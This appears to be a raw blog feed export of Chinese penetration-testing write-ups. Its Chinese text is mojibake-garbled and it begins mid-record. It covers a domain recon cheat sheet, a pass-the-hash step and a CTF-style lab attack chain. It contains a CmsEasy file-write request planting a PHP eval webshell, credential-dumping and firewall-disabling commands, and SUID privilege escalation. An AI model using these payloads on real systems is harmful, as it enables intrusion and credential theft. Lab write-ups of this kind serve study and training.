aa f4 a6 0f 08 b3 db f8 44 af c5 af 2e d7 a5 30 82 be 43 13 a4 4a 45 ba 8f f9 be af 75 f9 fb 4b e1 10 31 a7 0d a7 ab 93 f9 45 d2 3f 04 51 08 80 24 b0 f4 eb 39 a6 9b 77 f6 b3 ff 02 0b 66 ec 00 9c b6 8b c3 0b 0a 11 5a b3 4f 7f 26 ad cd de d3 35 62 fa 1a 25 87 d4 83 f2 3b 5b 60 88 b3 51 7c 81 5f 02 3a ec 2e 2d 9c 9c a6 ed bb 87 b7 6c 3e 77 75 46 47 b3 7c 9a c0 e7 cb 18 a1 ff 36 e9 5f bc 75 97 68 52 7a 05 b0 41 83 30 20 2f f5 67 9d 2f 96 7b 45 cb 61 f8 28 7a 1f 83 1d e7 cb 88 72 23 d1 f7 10 99 13 d1 5c 1e 12 7d ed 4c f8 f0 9b 01 cd ca ba 8c 10 e3 e8 4d ab be 56 ce 33 86 f5 81 68 42 17 6b 3f 22 a0 dd 29 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è¿™é¡¹è¯·æ±‚å°†åœ¨åŸŸ xiaorang.lab çš„åŸŸæ§åˆ¶å™¨å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\DC01.xiaorang.lab çš„ç”¨æˆ·å¸æˆ·</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Aldrich                  Guest                    </span><br><span class="line">krbtgt                   </span><br><span class="line">å‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¿™é¡¹è¯·æ±‚å°†åœ¨åŸŸ xiaorang.lab çš„åŸŸæ§åˆ¶å™¨å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line">ç»„å     Domain Admins</span><br><span class="line">æ³¨é‡Š     æŒ‡å®šçš„åŸŸç®¡ç†å‘˜</span><br><span class="line"></span><br><span class="line">æˆå‘˜</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            WIN2016$                 </span><br><span class="line">å‘½ä»¤æˆåŠŸå®Œæˆã€‚</span><br></pre></td></tr></table></figure><p>å‘ç°win2016åœ¨åŸŸç®¡é‡Œï¼Œdumpä¸€ä¸‹hashç›´æ¥æ‰“pthå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 40af44e61e8174dfa92f90a696be81e8 -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741449471016-e7b09fca-8daa-41f8-9f29-432b21f3ddab.png"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸä¿¡æ¯æ”¶é›†</title>
      <link href="/2025/02/06/%E5%9F%9F/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2025/02/06/%E5%9F%9F/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741254650160-846b4bcb-48f0-4a68-95c9-4474d7de9402.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741254656366-21feb557-efbc-4b08-b31f-6ff00e381479.png"></p><p>åŸŸæ¸—é€çš„ä¿¡æ¯æ”¶é›†ï¼š</p><p>åœ¨æ”»é˜²æ¼”ç»ƒä¸­ï¼Œå½“å®Œæˆè¾¹ç•Œçªç ´åè¿›å…¥å†…ç½‘ï¼Œä¿¡æ¯æœé›†æˆä¸ºä¸€ä¸ªé‡è¦ç¯èŠ‚ã€‚ å……åˆ†è·å–ä¿¡æ¯å¯ä»¥æœ‰æ•ˆæé«˜æ”»å‡»æ•ˆç‡ï¼Œå› æ­¤éœ€è¦æ˜ç¡®ä¸»è¦çš„ä¿¡æ¯æœé›†æ€è·¯ï¼Œå¹¶æœé›†å¿…è¦çš„ä¿¡æ¯ï¼Œä»¥æé«˜è¿™ä¸€é˜¶æ®µçš„è´¨é‡ï¼Œä¸ºåç»­æ”»å‡»æ‰“ä¸‹æ›´å¥½çš„åŸºç¡€ã€‚</p><p>åŸŸæ¸—é€çš„æ€è·¯å°±æ˜¯ï¼š</p><p>é€šè¿‡åŸŸæˆå‘˜ä¸»æœºï¼Œå®šä½å‡ºåŸŸæ§åˆ¶å™¨IPåŠåŸŸç®¡ç†å‘˜è´¦å·ï¼Œåˆ©ç”¨åŸŸæˆå‘˜ä¸»æœºä½œä¸ºè·³æ¿ï¼Œ</p><p>æ‰©å¤§èŒƒå›´ï¼Œåˆ©ç”¨åŸŸç®¡ç†å‘˜å¯ä»¥ç™»é™†åŸŸä¸­ä»»ä½•æˆå‘˜ä¸»æœºç‰¹æ€§ï¼Œå®šä½å‡ºåŸŸç®¡ç†å‘˜ç™»é™†è¿‡çš„ä¸»æœºIPï¼Œè®¾æ³•ä»åŸŸæˆå‘˜ä¸»æœºå†…å­˜ä¸­dumpå‡ºåŸŸç®¡ç†å‘˜å¯†ç ï¼Œè¿›è€Œæ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ã€æ¸—é€æ•´ä¸ªå†…ç½‘ã€‚ä¹Ÿå¯ä»¥é€šè¿‡åŸŸå†…Webåº”ç”¨ï¼ŒExchangeç³»ç»Ÿï¼Œç«¯å£æœåŠ¡ç­‰è·å–æƒé™è¿›è¡Œæ¨ªå‘ã€‚</p><p>DMZæ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜ï¼Œè€Œè®¾ç«‹çš„ä¸€ä¸ªä½äºå†…éƒ¨ç½‘ç»œä¸å¤–éƒ¨ç½‘ç»œä¹‹é—´çš„ç¼“å†²åŒºï¼Œåœ¨è¿™ä¸ªç½‘ç»œåŒºåŸŸå†…å¯ä»¥æ”¾ç½®ä¸€äº›å…¬å¼€çš„æœåŠ¡å™¨èµ„æºã€‚ä¾‹å¦‚FTPæœåŠ¡å™¨ã€E-MailæœåŠ¡å™¨åŠç½‘ç«™æœåŠ¡å™¨ç­‰å…è®¸å¤–éƒ¨ç”¨æˆ·è®¿é—®è¿™äº›æœåŠ¡å™¨ï¼Œä½†ä¸å¯èƒ½æ¥è§¦åˆ°å­˜æ”¾åœ¨å†…ç½‘ä¸­çš„ä¿¡æ¯ï¼Œå°±ç®—é»‘å®¢å…¥ä¾µDMZ ä¸­æœåŠ¡å™¨ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°å…¬å¸å†…éƒ¨ç½‘ç»œå®‰å…¨ï¼Œä¸å…è®¸ä»»ä½•å¤–éƒ¨ç½‘ç»œçš„ç›´æ¥è®¿é—®ï¼Œå®ç°å†…å¤–ç½‘åˆ†ç¦»ï¼Œåœ¨ä¼ä¸šçš„ä¿¡æ¯å®‰å…¨é˜²æŠ¤åŠ äº†ä¸€é“å±éšœã€‚</p><h2 id="ç½‘ç»œæ¶æ„ï¼š"><a href="#ç½‘ç»œæ¶æ„ï¼š" class="headerlink" title="ç½‘ç»œæ¶æ„ï¼š"></a>ç½‘ç»œæ¶æ„ï¼š</h2><p>1ã€åŸºæœ¬ä¿¡æ¯</p><p>IPã€ç½‘å…³ã€DNSã€å‡ºç½‘åˆ¤æ–­ã€æœ¬æœºç½‘ç»œè¿æ¥ä»¥åŠå¼€æ”¾ç«¯å£ã€æœ¬æœºçš„ä»£ç†ï¼ŒåŸŸåæ˜¯ä»€ä¹ˆç­‰</p><p>2ã€åŸŸå†…å®šä½</p><p>ipconfig &#x2F;all åˆ¤æ–­å­˜åœ¨åŸŸ-dns æœ‰åŸŸçš„æœ‰dnsåç¼€ï¼Œæ— åŸŸçš„æ— dnsåç¼€</p><p>net config workstation æŸ¥è¯¢å½“å‰ç™»é™†åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯</p><p>net time &#x2F;domain è·å–ä¸»åŸŸåï¼Œå…¶å®è¿™ä¸ªå°±æ˜¯ä¸»åŸŸçš„è®¡ç®—æœºåï¼Œå†é€šè¿‡nslookupæˆ–pingå‘½ä»¤æ¥è·å–ä¸»åŸŸçš„IPåœ°å€</p><p>3ã€åŸŸå†…è§’è‰²</p><p>æ ¹æ®ç”¨æˆ·åï¼Œè®¡ç®—æœºåï¼ŒIPåœ°å€ç­‰å¤šæ–¹ä½å»åˆ†æå®šæ€§</p><p>DMZåŒºã€åŠå…¬åŒºã€ç”Ÿäº§åŒºã€æ ¸å¿ƒDBã€æ ¸å¿ƒä¸šåŠ¡åŒºç­‰ç­‰ï¼›</p><p>WEBæœåŠ¡å™¨ã€å¼€å‘æœåŠ¡å™¨ã€æ–‡ä»¶æœåŠ¡å™¨ã€ä»£ç†æœåŠ¡å™¨ã€DNSæœåŠ¡å™¨ã€æ•°æ®å‚¨å­˜æœåŠ¡å™¨ç­‰ï¼›</p><p>4ã€å…¶ä»–ä¿¡æ¯</p><p>-ç«¯å£æ‰«æï¼ˆarp netbiosç­‰æ‰«æï¼‰</p><p>Fscan C2è‡ªå¸¦åŠŸèƒ½ç­‰</p><p>-setspnæŠ€æœ¯(Service Principal Nameï¼‰</p><p>åœ¨åŸŸç¯å¢ƒä¸­è¿è¡Œçš„å¤§é‡åº”ç”¨åŒ…å«äº†å¤šç§èµ„æºï¼Œä¸ºäº†å¯¹èµ„æºçš„åˆç†åˆ†ç±»å’Œå†åˆ†é…æä¾›ä¾¿åˆ©ï¼Œå¾®è½¯ç»™åŸŸå†…çš„æ¯ç§èµ„æºåˆ†é…äº†ä¸åŒçš„æœåŠ¡ä¸»é¢˜åç§°å³ SPN</p><p>setspn -q <em>&#x2F;</em></p><p>setspn -T god.org -q <em>&#x2F;</em></p><p>è§ä¸Šå›¾å‘½ä»¤é›†åˆï¼š</p><p>æŸ¥çœ‹å½“å‰åŸŸå†…çš„æ‰€æœ‰æœºå™¨ï¼Œ</p><p>æŸ¥çœ‹å½“å‰åŸŸä¸­çš„æ‰€æœ‰è´¦æˆ·åï¼Œ</p><p>æŸ¥çœ‹å½“å‰åŸŸå†…çš„æ‰€æœ‰ç»„åï¼Œ</p><p>æŸ¥çœ‹åˆ°å½“å‰åŸŸæ‰€åœ¨çš„ç½‘æ®µï¼Œ</p><p>æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„webç«™ç‚¹ï¼Œ</p><p>æŸ¥çœ‹å½“å‰åŸŸä¸­çš„æœåŠ¡å™¨ï¼Œ</p><p>åŸŸå†…ç”¨æˆ·ä¿¡æ¯</p><p>Domain Admins :åŸŸç®¡ç†å‘˜ï¼ˆé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒï¼‰</p><p>Domain Computers :åŸŸå†…æœºå™¨</p><p>Domain Controllers :åŸŸæ§åˆ¶å™¨</p><p>Domain Users :åŸŸç”¨æˆ·</p><p>Domain Guest : åŸŸè®¿å®¢ï¼Œæƒé™ä½</p><p>Enterprise Admins ï¼šä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·</p><p>ä¾‹ï¼šnet â€œDomain usersâ€ &#x2F;domain</p><h2 id="å®‰å…¨é˜²æŠ¤ï¼š"><a href="#å®‰å…¨é˜²æŠ¤ï¼š" class="headerlink" title="å®‰å…¨é˜²æŠ¤ï¼š"></a>å®‰å…¨é˜²æŠ¤ï¼š</h2><p>1ã€é˜²ç«å¢™</p><p>2ã€æ€æ¯’è½¯ä»¶</p><p>3ã€æµé‡ç›‘æ§ç­‰</p><p>netsh firewall show config</p><p>netsh advfirewall set allprofiles state off</p><p><a href="https://github.com/wwl012345/AVCheck">https://github.com/wwl012345/AVCheck</a></p><h2 id="å‡­æ®å£ä»¤ï¼š"><a href="#å‡­æ®å£ä»¤ï¼š" class="headerlink" title="å‡­æ®å£ä»¤ï¼š"></a>å‡­æ®å£ä»¤ï¼š</h2><p>1ã€ç³»ç»Ÿå‡­æ® Mimikatz</p><p>2ã€æµè§ˆå™¨å­˜å‚¨ HackBrowserData</p><p>3ã€ä¸‰æ–¹å·¥å…·å­˜å‚¨ SharpDecryptPwd</p><p>4ã€Webåº”ç”¨ç›¸å…³é…ç½® è§å…·ä½“Webç¨‹åº</p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p><a href="https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA">https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA</a></p><p>5ã€è¡¥å……å…¶ä»–æœç´¢ï¼š</p><p>ä½¿ç”¨å‘½ä»¤æœé›†å„ç±»æ•æ„Ÿå¯†ç é…ç½®æ–‡ä»¶</p><p>dir &#x2F;b &#x2F;s user.<em>,pass.</em>,config.<em>,username.</em>,password.*</p><p>ä½¿ç”¨å‘½ä»¤æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶çš„æŸä¸ªå­—æ®µ</p><p>findstr &#x2F;c:â€userâ€ &#x2F;c:â€passâ€ &#x2F;si *.txt</p><p>ä½¿ç”¨æ‰¾å‡ºæ‰€æœ‰åŒ…å« password çš„æ–‡ä»¶</p><p>findstr &#x2F;si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</p><p>å…·ä½“ï¼š</p><p>1.ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰</p><p>2.è¿æ¥å·¥å…·å­˜å‚¨å¯†ç ï¼Œxshell,Navicatç­‰</p><p>3.æµè§ˆå™¨ä¿å­˜å¯†ç ã€æµè§ˆå™¨Cookies</p><p>4.å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389å’Œipc$è¿æ¥è®°å½•ã€å›æ”¶ç«™å†…å®¹</p><p>5.Windows ä¿å­˜çš„WIFIå¯†ç </p><p>6.ç½‘ç»œå†…éƒ¨çš„å„ç§å¸å·å’Œå¯†ç ï¼Œå¦‚ï¼šEmailã€VPNã€FTPã€OAç­‰</p><h2 id="æœ¬æœºå‡­æ®æ”¶é›†ç±»ï¼š"><a href="#æœ¬æœºå‡­æ®æ”¶é›†ç±»ï¼š" class="headerlink" title="æœ¬æœºå‡­æ®æ”¶é›†ç±»ï¼š"></a>æœ¬æœºå‡­æ®æ”¶é›†ç±»ï¼š</h2><p>1ã€HackBrowserData å¿«é€Ÿè·å–æµè§ˆå™¨çš„è´¦æˆ·å¯†ç <br><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>2ã€Searchall å¿«é€Ÿæœç´¢æœåŠ¡å™¨ä¸­çš„æœ‰å…³æ•æ„Ÿä¿¡æ¯è¿˜æœ‰æµè§ˆå™¨çš„è´¦æˆ·å¯†ç <br><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a><br>searchall64.exe search -p æŒ‡å®šè·¯å¾„<br>searchall64.exe browser -b æŒ‡å®šçš„æµè§ˆå™¨æˆ–è€…all</p><p>3ã€Pillager é€‚ç”¨äºåæ¸—é€æœŸé—´çš„ä¿¡æ¯æ”¶é›†å·¥å…·ï¼Œå¯ä»¥æ”¶é›†ç›®æ ‡æœºå™¨ä¸Šæ•æ„Ÿä¿¡æ¯<br><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p><h2 id="å¯¹å¤–æ‰“ç‚¹æ‰«æç±»ï¼š"><a href="#å¯¹å¤–æ‰“ç‚¹æ‰«æç±»ï¼š" class="headerlink" title="å¯¹å¤–æ‰“ç‚¹æ‰«æç±»ï¼š"></a>å¯¹å¤–æ‰“ç‚¹æ‰«æç±»ï¼š</h2><p>1ã€FScanå†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚<br><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>2ã€Templateå¯å‘å¼å†…ç½‘æ‰«æ<br><a href="https://github.com/1n7erface/Template">https://github.com/1n7erface/Template</a></p><h2 id="ADåŸŸç¯å¢ƒåˆ†æç±»ï¼š"><a href="#ADåŸŸç¯å¢ƒåˆ†æç±»ï¼š" class="headerlink" title="ADåŸŸç¯å¢ƒåˆ†æç±»ï¼š"></a>ADåŸŸç¯å¢ƒåˆ†æç±»ï¼š</h2><p>1ã€Adfind åœ¨åŸŸç¯å¢ƒä¸‹éå¸¸å¼ºå¤§çš„ä¿¡æ¯æœé›†å·¥å…·<br><a href="https://www.joeware.net/freetools/tools/adfind/">https://www.joeware.net/freetools/tools/adfind/</a><br>åŸŸæ§æŸ¥è¯¢ï¼š<br>Adfind.exe -sc dclist<br>Adfind.exe -schema -s base objectversion<br>åŸŸç”¨æˆ·æŸ¥è¯¢ï¼š<br>Adfind.exe -users name<br>Adfind.exe -sc u:webadmin<br>åŸŸç”¨æˆ·ç»„æŸ¥è¯¢ï¼š<br>Adfind.exe -f â€œobjectClass&#x3D;groupâ€<br>Adfind.exe -f â€œobjectClass&#x3D;groupâ€ -dn<br>æŸ¥è¯¢åŸŸä¸­è®¡ç®—æœºä¿¡æ¯ï¼š<br>Adfind.exe -f â€œobjectcategory&#x3D;computerâ€<br>AdFind.exe -f â€œobjectcategory&#x3D;computerâ€ dn<br>æŸ¥è¯¢æ‰€æœ‰GPOï¼š<br>Adfind.exe -sc gpodmp<br>æŸ¥è¯¢åŸŸå†…å§”æ´¾ï¼š<br><a href="https://mp.weixin.qq.com/s/WrUyPPBAIE-zmC3CfLYS7Q">https://mp.weixin.qq.com/s/WrUyPPBAIE-zmC3CfLYS7Q</a></p><p>2ã€BloodHound å¯è§†åŒ–å›¾å½¢åˆ†æåŸŸç¯å¢ƒä¸­çš„å…³ç³»çš„å·¥å…·<br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br>-å®‰è£…ä½¿ç”¨ï¼š<br><a href="https://cn-sec.com/archives/146548.html">https://cn-sec.com/archives/146548.html</a><br><a href="https://mp.weixin.qq.com/s/cxfXKNhevXM6y31R7x53Sg">https://mp.weixin.qq.com/s/cxfXKNhevXM6y31R7x53Sg</a><br>-é‡‡é›†æ•°æ®ï¼š<br><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a><br><a href="https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/f4d9c1af1529124d33c9f360a27686eea51755e1/Collectors</a></p><h2 id="äºŒè¿›åˆ¶é‡‡é›†å·¥å…·å‘½ä»¤ï¼š"><a href="#äºŒè¿›åˆ¶é‡‡é›†å·¥å…·å‘½ä»¤ï¼š" class="headerlink" title="äºŒè¿›åˆ¶é‡‡é›†å·¥å…·å‘½ä»¤ï¼š"></a>äºŒè¿›åˆ¶é‡‡é›†å·¥å…·å‘½ä»¤ï¼š</h2><p>SharpHound.exe -c all</p><h2 id="powershellé‡‡é›†å·¥å…·å‘½ä»¤ï¼š"><a href="#powershellé‡‡é›†å·¥å…·å‘½ä»¤ï¼š" class="headerlink" title="powershellé‡‡é›†å·¥å…·å‘½ä»¤ï¼š"></a>powershellé‡‡é›†å·¥å…·å‘½ä»¤ï¼š</h2><p>powershell -exec bypass -command â€œImport-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c allâ€<br>-å¯¼å…¥æ•°æ®ååˆ†æ</p><p>#å…¶ä»–ï¼š<br><a href="https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">https://github.com/guchangan1/All-Defense-Tool#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Delegation</title>
      <link href="/2025/02/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/"/>
      <url>/2025/02/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312005303-eb51c4ac-e61d-4918-ac61-51437d291317.png"></p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E&#x2F;#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell</a></p><p>åˆ©ç”¨æ¼æ´</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312259844-9498cf06-a3e0-4c18-9e03-54396c58b39e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host:39.98.107.54</span><br><span class="line">Content-Length: 76</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;</span><br><span class="line">Cookie: PHPSESSID=qrqmi2nksq9l5qatj65c1i69c3; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šèšå‰‘</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312766961-f0ded55d-60e1-4db8-a690-2e975ecda57b.png"></p><p>suidæ¢é’ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741312536946-9dc507fe-7e1a-4218-95ae-d16010197add.png"></p><p>è¿™é‡Œæ˜¯diffææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313271445-62421f45-3e10-4fe5-bf3e-fca7b530ea41.png"></p><h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><p>vpså¼€ä¸ª80ä¼ fscanæ‰«æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741313137570-60c8c2f4-0ce4-467b-b2e2-4717e8071b83.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.4.36     is alive</span><br><span class="line">(icmp) Target 172.22.4.7      is alive</span><br><span class="line">(icmp) Target 172.22.4.45     is alive</span><br><span class="line">(icmp) Target 172.22.4.19     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">[*] alive ports len is: 15</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   [-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] OsInfo 172.22.4.7    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:ä¸­æ–‡ç½‘é¡µæ 